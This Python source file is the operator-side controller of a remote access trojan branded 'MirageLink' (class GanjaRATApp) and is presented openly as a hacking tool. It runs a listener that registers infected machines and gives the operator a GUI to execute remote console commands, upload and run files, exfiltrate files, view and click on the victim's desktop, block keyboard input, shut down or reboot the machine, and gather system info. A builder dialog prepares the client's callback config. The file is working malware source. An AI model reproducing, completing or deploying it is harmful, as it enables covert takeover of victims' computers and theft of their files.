import customtkinter as ctk
import socket
import pygame
import os
import time
import json
import uuid
import queue
import threading
import cv2, numpy as np
from pynput import mouse
from tkinter import messagebox
from tkinter import filedialog

pygame.init()
pygame.mixer.init()

SETTINGS_FILE = "settings.json"
DEFAULT_SETTINGS = {
    "key": 0,
    "host": "127.0.0.1",
    "port": 5552,
    "theme": "default"
}

def create_key():
    try:
        data = load_settings()
        if data["key"] == 0:
            unique_key = str(uuid.uuid4())
            data["key"] = unique_key
            with open(SETTINGS_FILE, "w", encoding="utf-8") as file:
                json.dump(data, file, indent=4, ensure_ascii=False)
            
    except Exception as e:
        print(f"Error in create key! {e}")

def load_settings():
    if not os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, "w", encoding="utf-8") as file:
            json.dump(DEFAULT_SETTINGS, file, indent=4, ensure_ascii=False)

    with open(SETTINGS_FILE, "r", encoding="utf-8") as file:
        return json.load(file)

def set_host(host, port):
    settings = load_settings()

    settings["host"] = host
    settings["port"] = port

    with open(SETTINGS_FILE, "w", encoding="utf-8") as file:
        json.dump(settings, file, indent=4, ensure_ascii=False)


class Server(ctk.CTk):
    def __init__(self, host, port, gui):
        self.host = host 
        self.port = port  
        self.gui = gui  
        self.clients = []  
        self.running = False  

        self.msg_queue = queue.Queue()

        self.data = load_settings()
        self.key = self.data["key"]

    def start_server(self):
        self.running = True
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
                server_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                server_socket.bind((self.host, self.port))
                server_socket.listen(10)
                print(f"Server run {self.host}:{self.port}")

                while self.running:
                    conn, addr = server_socket.accept()
                    print(f"New connection {addr}")

                    try:
                        data = conn.recv(1024)
                        if data.decode().strip() != self.key:
                            conn.send("exit".encode('utf-8'))
                            conn.close()
                            print(f"Not valid key: {addr}. connection close")
                            continue
                    except Exception as e:
                        print(f"Error to get key! {addr}: {e}")
                        conn.close()
                        continue

                    client_info = {"conn": conn, "addr": addr, "ip": addr[0], "port": addr[1], "country": "Unknown"}
                    self.clients.append(client_info)

                    self.gui.after(0, self.gui.create_users_app, self.clients)

                    client_thread = threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True)
                    client_thread.start()
        
                    sound = pygame.mixer.Sound('sounds/plus.mp3')
                    sound.play()
        except Exception as e:
            print(f"Server error: {e}")
        finally:
            self.running = False

    def stop_server(self):
        self.running = False
        print("Stop server")

    def send_msg(self, msg):
        messagebox.showinfo('MirageLink', msg)

    def handle_client(self, conn, addr):
        ip, port = addr
        try:
            with conn:
                while self.running:
                    command = conn.recv(1024).decode('utf-8', errors="ignore").strip()
                    
                    if not command:
                        break  
                    
                    self.msg_queue.put((addr, command))

                    if 'download' in command:
                        threading.Thread(target=self.download_file, args=('', ip, port), daemon=True).start()
                    
                    elif command == "info":
                        info = conn.recv(5000).decode()
                        print(info)

        except (ConnectionError, socket.error) as e:
            print(f"Client {addr} disconnected: {e}")
        except (Exception) as e:
            print(f"can t decode error: {e}")
        finally:
            print(f"Connection: {addr} closed")
            self.remove_client(addr)

    def send_to_client(self, ip, port, message):
        for client in self.clients:
            if client["ip"] == ip and client["port"] == port:
                try:
                    client["conn"].send(message.encode('utf-8'))
                    print(f"Message sended: {ip}:{port}")

                    if 'send' in message:
                        filepath = message[4:].strip()
                        print(f'Sended: {filepath}')
                        threading.Thread(target=self.send_file, args=(filepath, ip, port), daemon=True).start()

                    elif 's_run' in message:
                        filepath = message[5:].strip()
                        print(f'Send and run: {filepath}')
                        threading.Thread(target=self.send_file, args=(filepath, ip, port), daemon=True).start()

                    elif 'download' in message:
                        file = message[8:].strip()
                        print(f'Download: {file}')
                        threading.Thread(target=self.download_file, args=('', ip, port), daemon=True).start()
                    
                    elif message == "remote_desktop":
                        self.rem_desk = RemoteDesktop(client["conn"])
                        threading.Thread(target=self.rem_desk.start, daemon=True).start()

                except Exception as e:
                    print(f"Error sending {ip}:{port}: {e}")
                return
        print(f"Client {ip}:{port} not found")

    def send_file(self, filename, ip, port):
        for client in self.clients:
            if client["ip"] == ip and client["port"] == port:
                try:
                    if os.path.exists(filename):
                        file_size = os.path.getsize(filename)
                        header = f"FILE {file_size} {os.path.basename(filename)}".encode('utf-8')
                        print(header)
                        client["conn"].send(header.ljust(1024)) 
                        time.sleep(1)
                        with open(filename, 'rb') as file:
                            while True:
                                data = file.read(24576)  
                                if not data:
                                    break
                                client["conn"].send(data)  
                        print(f"File {filename} succeful sended to: {ip}:{port}.")
                    else:                        
                        client["conn"].send(b"FILE_NOT_FOUND")
                        print(f"File {filename} not found.")
                    
                except Exception as e:
                    print(f"Error in send file to client: {ip}:{port}: {e}")
                return
        print(f"Client {ip}:{port} not found.")

    def download_file(self, save_path, ip, port):
        for client in self.clients:
            if client["ip"] == ip and client["port"] == port:
                try:
                    client["conn"].send(b"SEND_FILE")

                    header = client["conn"].recv(1024).decode('utf-8').strip()
                    if header.startswith("FILE"):
                        parts = header.split()
                        file_size = int(parts[1])
                        filename = parts[2]

                        save_filename = os.path.join(save_path, filename)
                        with open(save_filename, 'wb') as file:
                            received = 0
                            while received < file_size:
                                data = client["conn"].recv(24576)
                                if not data:
                                    break
                                file.write(data)
                                received += len(data)
                        print(f"File {filename} succeful download from: {ip}:{port}.")
                    else:
                        print("Error in download, not valid title.")
                        print(header)
                except Exception as e:
                    print(f"Error in download file from client: {ip}:{port}: {e}")
                return
        print(f"Client {ip}:{port} not found")

    def remove_client(self, addr):
        ip, port = addr
        print(f"Remove client: {ip}:{port}")
        for client in self.clients:
            if client["ip"] == ip and client["port"] == port:
                self.clients.remove(client)
                break
        self.gui.after(0, self.gui.create_users_app, self.clients)


class GanjaRATApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("MirageLink")
        self.geometry("1000x500")
        self.resizable(False, True)
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("green")

        self.users = []
        self.user_frames = []

        self.load = load_settings()
        self.HOST, self.PORT = self.load['host'], self.load['port']

        create_key()

        self.server = Server(self.HOST, self.PORT, self)

        server_thread = threading.Thread(target=self.server.start_server, daemon=True)
        server_thread.start()

        self.create_app()

    def create_app(self):
        self.gbw_frame = ctk.CTkFrame(self, width=1000, height=100, fg_color='#4B0082')
        self.gbw_title = ctk.CTkLabel(self.gbw_frame, text='MirageLink - made by GBW!', text_color='black', font=('Bold', 30))
        self.gbw_frame.pack(side='top', fill='x')
        self.gbw_title.pack(side='left', pady=10)

        self.menu = ctk.CTkFrame(self, width=1000, height=30, fg_color='#9370DB')
        self.menu.pack(side='top', fill='x')

        self.text_ip = ctk.CTkLabel(self.menu, text='IP', text_color='white', font=('Bold', 20))
        self.text_port = ctk.CTkLabel(self.menu, text='PORT', text_color='white', font=('Bold', 20))
        self.text_contry = ctk.CTkLabel(self.menu, text='CONTRY', text_color='white', font=('Bold', 20))
        self.builder_btn = ctk.CTkButton(self.menu, height=10, width=100, text='BUILD', text_color='red', font=('Bold', 15),
                                          fg_color='#9370DB', command=self.draw_config_app)
        self.info_btn = ctk.CTkButton(self.menu, height=10, width=100, text='Info', text_color='red', font=('Bold', 15),
                                          fg_color='#9370DB', command=self.draw_info_app)
        self.setting_btn = ctk.CTkButton(self.menu, height=10, width=100, text='Setting', text_color='red', font=('Bold', 15),
                                          fg_color='#9370DB', command=self.draw_settings_app)
        self.text_ip.pack(side='left', padx=75)
        self.text_port.pack(side='left', padx=75)
        self.text_contry.pack(side='left', padx=75)
        self.builder_btn.pack(side='right', padx=5)
        self.setting_btn.pack(side='right', padx=5)
        self.info_btn.pack(side='right', padx=5)

    def create_user(self, ip, port, country):
        user_ground = ctk.CTkFrame(self, width=970, height=150, fg_color='#4B0082', corner_radius=10)
        user_ground.pack(side='top', padx=10, pady=5, fill='x')

        user_ip = ctk.CTkLabel(user_ground, text=f"IP: {ip}", text_color="white", font=('Bold', 15))
        user_port = ctk.CTkLabel(user_ground, text=f"Port: {port}", text_color="white", font=('Bold', 15))
        user_contry = ctk.CTkLabel(user_ground, text=f"Country: {country}", text_color="white", font=('Bold', 15))
        user_ip.pack(side='left', padx=50)
        user_port.pack(side='left', padx=50)
        user_contry.pack(side='left', padx=50)

        select_func_button = ctk.CTkButton(user_ground, width=300, height=45, text='Function', font=('Bold', 20),
                                           corner_radius=10, command=lambda: self.draw_func_app(ip, port), fg_color='#9370DB')
        select_func_button.pack(side='right', pady=5, padx=5)

        self.user_frames.append(user_ground)

    def clear_users(self):
        for frame in self.user_frames:
            frame.destroy()
        self.user_frames.clear()

    def create_users_app(self, users: list):
        self.clear_users() 
        for user in users:
            self.create_user(user["ip"], user["port"], user["country"])

    def draw_settings_app(self):
        self.setting_app = SettingsApp(self)
        self.setting_app.grab_set()

    def draw_info_app(self):
        self.info_app = InfoApp(self)
        self.info_app.grab_set()

    def draw_config_app(self):
        self.config_app = ConfigApp(self) 
        self.config_app.grab_set() 

    def draw_func_app(self, ip, port):
        func_app = FunctionApp(ip, port, self.server)
        threading.Thread(target=func_app.mainloop())


class SettingsApp(ctk.CTkToplevel): 
    def __init__(self, parent):
        super().__init__(parent) 

        self.title("Settings")
        self.geometry("600x500")
        self.resizable(False, False)

        self.load = load_settings()
        self.host, self.port = self.load['host'], self.load['port']

        self.create_host_app()

    def create_host_app(self):
        self.input_frame = ctk.CTkFrame(self, width=600, height=500, corner_radius=10, fg_color="gray30")
        self.input_frame.pack(side='top', pady=10, padx=10, expand=True, fill='both')

        self.label_host = ctk.CTkLabel(self.input_frame, text='Host and port', text_color='white', font=('Bold', 40))
        self.label_host.pack(side='top', pady=5, padx=10)

        self.input_host = ctk.CTkEntry(self.input_frame, width=300, height=40, placeholder_text=f'HOST: {self.host}', font=('Bold', 20), text_color='green')
        self.input_port = ctk.CTkEntry(self.input_frame, width=300, height=40, placeholder_text=f'PORT: {self.port}', font=('Bold', 20), text_color='green')
        self.input_host.pack(side='top', pady=5, padx=15)
        self.input_port.pack(side='top', pady=5, padx=15)

        self.set_host_btn = ctk.CTkButton(self.input_frame, width=250, height=40, text='Set', font=('Bold', 30),
                                           command=self.update_host)
        self.set_host_btn.pack(padx=10, pady=5)

        self.set_theme_title = ctk.CTkLabel(self.input_frame, text='Theme', text_color='white', font=('Bold', 30))
        self.set_theme_title.pack(side='left', pady=10, padx=10)
        self.check = ctk.CTkSwitch(self.input_frame)
        self.check.pack(side='left', pady=10, padx=10) 

    def update_host(self):
        host = self.input_host.get()
        port = int(self.input_port.get())

        set_host(host, port)

        self.input_host.delete(0, "end")
        self.input_port.delete(0, "end")

        self.input_host.configure(placeholder_text=host)
        self.input_port.configure(placeholder_text=port)


class InfoApp(ctk.CTkToplevel): 
    def __init__(self, parent):
        super().__init__(parent) 

        self.title("Info")
        self.geometry("600x500")
        self.resizable(False, False)

        self.create_info_app()

    def create_info_app(self):
        self.info_frame = ctk.CTkFrame(self, width=600, height=500, corner_radius=15, fg_color='gray30')
        self.info_frame.pack(pady=10, padx=10, fill='both', expand=True)

        self.title_info = ctk.CTkLabel(self.info_frame, text='INFORMATION', font=('Bold', 50))
        self.title_info.pack(side='top', pady=10)

        self.team_text = ctk.CTkLabel(self.info_frame, text='Made by team GBW', font=('Bold', 30))
        self.team_text.pack(side='top', pady=5)

        self.about_text = ctk.CTkLabel(self.info_frame, text='about about anou about about anouabout about \n anouabout about anouabout about anouabout\n about anouabout about anouabout about anouabout\n about anou',
                                        font=('Bold', 18))
        self.about_text.pack(side='top', pady=5)


class ConfigApp(ctk.CTkToplevel): 
    def __init__(self, parent):
        super().__init__(parent) 

        self.title("Build Config")
        self.geometry("600x500")
        self.resizable(False, False)

        self.create_config_app()

    def create_config_app(self):
        self.login_frame = ctk.CTkFrame(self, fg_color="gray30", corner_radius=10)
        self.login_frame.pack(side='top', pady=40, padx=20, fill="both", expand=True)

        self.login_title = ctk.CTkLabel(self.login_frame, text='Build config file', text_color='green', font=('Bold', 60))
        self.login_title.pack(side='top', pady=10)

        self.entry_ip = ctk.CTkEntry(self.login_frame, width=500, height=75, placeholder_text="IP", text_color='green', font=('Bold', 50))
        self.entry_ip.pack(pady=10, padx=20)

        self.entry_port = ctk.CTkEntry(self.login_frame, width=500, height=75, placeholder_text="PORT", text_color='green', font=('Bold', 50))
        self.entry_port.pack(pady=10, padx=20)

        self.btn = ctk.CTkButton(self.login_frame, width=250, height=50, text="Enter", command=self.remove_frame)
        self.btn.pack()

    def build_info_file(self, ip, port):
        config_info_list = [f'{ip}\n', f'{port}']
        try:
            with open('a.txt', 'w', encoding='utf-8') as file:
                file.writelines(config_info_list)
            return True
        except Exception:
            return False

    def remove_frame(self):
        ip = self.entry_ip.get()
        port = self.entry_port.get()
        build = self.build_info_file(ip, port)
        self.destroy()
        if build:
            messagebox.showinfo('MiragLink', 'Config file has been build, drop this to main file')
        else:
            messagebox.showerror('MirageLink', 'Build config file has been not complete! Error')


class FunctionApp(ctk.CTk):
    def __init__(self, ip, port, server):
        super().__init__()

        self.ip = ip
        self.port = port
        self.server = server

        self.title("Function")
        self.geometry("600x500")
        
        self.comm = CommandFunction(self.server)
        self.create_func_app()

        #self.comm.download_file(ip, port, 'playit.txt') - скачивание файла
    
    def create_func_app(self):
        self.gbw_func_frame = ctk.CTkFrame(self, width=600, height=60, fg_color='#4B0082')
        self.gbw_func_title = ctk.CTkLabel(self.gbw_func_frame, text=f'Func for target: {self.ip}', text_color='black', font=('Bold', 25))
        self.gbw_func_frame.pack(side='top', fill='x')
        self.gbw_func_title.pack(side='top', pady=10)

        self.tabview = ctk.CTkTabview(self)
        self.tabview.pack(side='top', fill='both', expand=True)

        self.tabview.add("Fun")
        self.tabview.add("System")
        self.tabview.add("Files")
        self.tabview.add("Info")

        self.add_content_to_tabs()

    def add_content_to_tabs(self):
        self.fun_tab = self.tabview.tab("Fun")

        self.input_link = ctk.CTkEntry(self.fun_tab, width=300, height=40, placeholder_text='Enter link', font=('Bold', 20), text_color='green')

        self.open_link_btn = ctk.CTkButton(self.fun_tab, text="Open link", height=50, width=200,
                                           command=lambda: self.comm.open_link(self.ip, self.port, self.input_link.get()), font=('Bold', 15), fg_color='#9370DB')
        
        self.blockinput_btn = ctk.CTkButton(self.fun_tab, text='Block keyboard', height=50, width=200,
                                command=lambda: self.comm.block_input(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')

        self.blockinput_btn.pack(side='top', pady=10, padx=50)
        self.input_link.place(x=10, y=10)
        self.open_link_btn.place(x=330, y=7)


        self.sys_tab = self.tabview.tab("System")
        self.console_btn = ctk.CTkButton(self.sys_tab, text='Console', height=50, width=200,
                                command=lambda: self.comm.console(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
        
        self.off_btn = ctk.CTkButton(self.sys_tab, text='Off pc', height=50, width=200,
                                command=lambda: self.comm.off_pc(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
        
        self.reboot_btn = ctk.CTkButton(self.sys_tab, text='Reboot pc', height=50, width=200,
                                command=lambda: self.comm.off_pc(self.ip, self.port, True), font=('Bold', 15), fg_color='#9370DB')
        
        self.remote_desk_btn = ctk.CTkButton(self.sys_tab, text='Remote Desktop', height=50, width=200,
                                command=lambda: self.comm.remote_desktop(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
        
        self.ping_btn = ctk.CTkButton(self.sys_tab, text='DELETE YOURSELF FROM PC', height=50, width=500, fg_color='red', 
                                       command=lambda: self.comm.kill_yourself(self.ip, self.port, "exit"), font=('Bold', 20))
        
        self.ping_btn.pack(side='bottom', pady=20, padx=20)
        self.console_btn.pack(side='top', pady=10, padx=50)
        self.remote_desk_btn.pack(side='top', pady=10, padx=50)
        

        self.file_tab = self.tabview.tab("Files")
        self.send_and_run_btn = ctk.CTkButton(self.file_tab, text='Send and run', height=50, width=200,
                                       command=lambda: self.comm.send_and_run(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
        
        self.send_file_btn = ctk.CTkButton(self.file_tab, text='Sendfile', height=50, width=200,
                                       command=lambda: self.comm.send_file(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
        
        self.send_file_btn.pack(side='top', pady=10, padx=50)
        self.send_and_run_btn.pack(side='top', pady=10, padx=50)
        

        self.info_tab = self.tabview.tab("Info")
        self.get_info_btn = ctk.CTkButton(self.info_tab, text='Get info', height=50, width=200,
                                       command=lambda: self.comm.get_info(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
        
        self.get_info_btn.pack(side='top', pady=10, padx=50)

    def show_tab(self, tab_name):
        self.tabview.set(tab_name)


class CollectionsInfo(ctk.CTkToplevel): 
    def __init__(self, parent, info):
        super().__init__(parent) 

        self.title("Info")
        self.geometry("600x500")
        self.resizable(False, False)
        self.info = info

        self.create_info_app()

    def create_info_app(self):
        self.info_frame = ctk.CTkFrame(self, width=600, height=500, corner_radius=15, fg_color='gray30')
        self.info_frame.pack(pady=10, padx=10, fill='both', expand=True)

        self.title_info = ctk.CTkLabel(self.info_frame, text='PC INFO', font=('Bold', 50))
        self.title_info.pack(side='top', pady=10)

        self.team_text = ctk.CTkLabel(self.info_frame, text='Made by team GBW', font=('Bold', 30))
        self.team_text.pack(side='top', pady=5)

        self.about_text = ctk.CTkLabel(self.info_frame, text=self.info,
                                        font=('Bold', 18))
        self.about_text.pack(side='top', pady=5)


class CommandFunction:
    def __init__(self, server):
        self.server = server

    def off_pc(self, ip, port, reboot=False):
        if reboot == False:
            threading.Thread(target=self.server.send_to_client, args=(ip, port, 'off'), daemon=True).start()
        else:
            threading.Thread(target=self.server.send_to_client, args=(ip, port, 'reboot'), daemon=True).start()

    def console(self, ip, port):
        self.console_app = ConsoleApp(ip, port, self.server)

    def block_input(self, ip, port):
        threading.Thread(target=self.server.send_to_client, args=(ip, port, 'block_input'), daemon=True).start()

    def remote_desktop(self, ip, port):
        threading.Thread(target=self.server.send_to_client, args=(ip, port,'remote_desktop'), daemon=True).start()

    def get_info(self, ip, port):
        threading.Thread(target=self.server.send_to_client, args=(ip, port, 'get_info'), daemon=True).start()

    def open_link(self, ip, port, link):
        threading.Thread(target=self.server.send_to_client, args=(ip, port, f'open_link {link}'), daemon=True).start()

    def send_msg(self, msg):
        messagebox.showinfo('MirageLink', msg)

    def send_and_run(self, ip, port):
        file_path = filedialog.askopenfilename(title="Select file")
        if file_path:
            threading.Thread(target=self.server.send_to_client, args=(ip, port, f's_run {file_path}'), daemon=True).start()
    
    def send_file(self, ip, port):
        file_path = filedialog.askopenfilename(title="Select file")
        if file_path:
            threading.Thread(target=self.server.send_to_client, args=(ip, port, f'send {file_path}'), daemon=True).start()

    def download_file(self, ip, port, filename):
        threading.Thread(target=self.server.send_to_client, args=(ip, port, f'download {filename}'), daemon=True).start()

    def kill_yourself(self, ip, port, msg):
        threading.Thread(target=self.server.send_to_client, args=(ip, port, msg), daemon=True).start()


class ConsoleApp(ctk.CTkToplevel): 
    def __init__(self, ip, port, server):
        super().__init__()

        self.ip = ip
        self.port = port
        self.server = server

        self.title("Mirage console")
        self.geometry("600x500")
        self.resizable(False, False)

        self.create_console_app()
        threading.Thread(target=self.listen_for_messages, daemon=True).start()

    def create_console_app(self):
        self.console_frame = ctk.CTkFrame(self, fg_color="gray20")
        self.console_frame.pack(fill="both", expand=True, padx=10, pady=10)

        self.console_output = ctk.CTkTextbox(self.console_frame, wrap="word", state="disabled")
        self.console_output.pack(fill="both", expand=True, padx=10, pady=10)

        self.console_input = ctk.CTkEntry(self.console_frame, placeholder_text="Enter a command...")
        self.console_input.pack(fill="x", padx=10, pady=10)

        self.send_button = ctk.CTkButton(self.console_frame, text="Send", command=self.send_command)
        self.send_button.pack(pady=10)

    def send_command(self):
        command = self.console_input.get().strip()
        if command:
            threading.Thread(
                target=self.server.send_to_client,
                args=(self.ip, self.port, f'console {command}'),
                daemon=True
            ).start()
            self.console_input.delete(0, "end")
            self.append_output(f"> {command}")

    def listen_for_messages(self):
        while True:
            addr, message = self.server.msg_queue.get()
            if addr[0] == self.ip:
                self.append_output(message)

    def append_output(self, text):
        self.console_output.configure(state="normal")
        self.console_output.insert("end", text + "\n")
        self.console_output.configure(state="disabled")
        self.console_output.see("end") 


class RemoteDesktop:
    def __init__(self, conn, window_size=(1280, 720)):  
        self.window_width, self.window_height = window_size
        self.conn = conn
        self.window_name = "Mirage Desktop"
        self.frame_size = (1, 1)
        self.offset_x = 0
        self.offset_y = 0
        self.scale = 1.0

    def start(self):
        threading.Thread(target=self.receive_frames, daemon=True).start()
        threading.Thread(target=self.listen_mouse, daemon=True).start()
    
    def stop(self):
        cv2.destroyAllWindows()

    def receive_frames(self):
        cv2.namedWindow(self.window_name, cv2.WINDOW_NORMAL)
        cv2.resizeWindow(self.window_name, self.window_width, self.window_height)

        while True:
            try:
                size = int.from_bytes(self.conn.recv(4), 'big')
                print("debug")
                data = b''
                while len(data) < size:
                    packet = self.conn.recv(size - len(data))
                    if not packet:
                        return
                    data += packet

                img_array = np.frombuffer(data, dtype=np.uint8)
                frame = cv2.imdecode(img_array, cv2.IMREAD_COLOR)

                h, w = frame.shape[:2]
                self.frame_size = (w, h)

                scale_w = self.window_width / w
                scale_h = self.window_height / h
                self.scale = min(scale_w, scale_h)

                resized = cv2.resize(frame, None, fx=self.scale, fy=self.scale)

                display_frame = np.zeros((self.window_height, self.window_width, 3), dtype=np.uint8)
                new_h, new_w = resized.shape[:2]
                self.offset_x = (self.window_width - new_w) // 2
                self.offset_y = (self.window_height - new_h) // 2
                display_frame[self.offset_y:self.offset_y+new_h, self.offset_x:self.offset_x+new_w] = resized

                cv2.imshow(self.window_name, display_frame)

                if cv2.waitKey(1) == 27:
                    break
            except Exception as e:
                print(f"[SERVER] Ошибка: {e}")
                break

    def listen_mouse(self):
        def on_click(x, y, button, pressed):
            if not pressed or self.frame_size == (1, 1):
                return

            try:
                win_x, win_y, win_w, win_h = cv2.getWindowImageRect(self.window_name)
                print("debug2")
            except:
                return

            local_x = x - win_x - self.offset_x
            local_y = y - win_y - self.offset_y

            if not (0 <= local_x < self.frame_size[0] * self.scale and 0 <= local_y < self.frame_size[1] * self.scale):
                return

            real_x = int(local_x / self.scale)
            real_y = int(local_y / self.scale)

            btn = 'left' if button.name == 'left' else 'right'

            try:
                self.conn.sendall(f"CLICK:{real_x}:{real_y}:{btn}".encode())
                print(f"[SERVER] Клик по: ({real_x}, {real_y}) [{btn}]")
            except:
                pass

        mouse.Listener(on_click=on_click).start()


if __name__ == "__main__":
    app = GanjaRATApp()
    app.mainloop()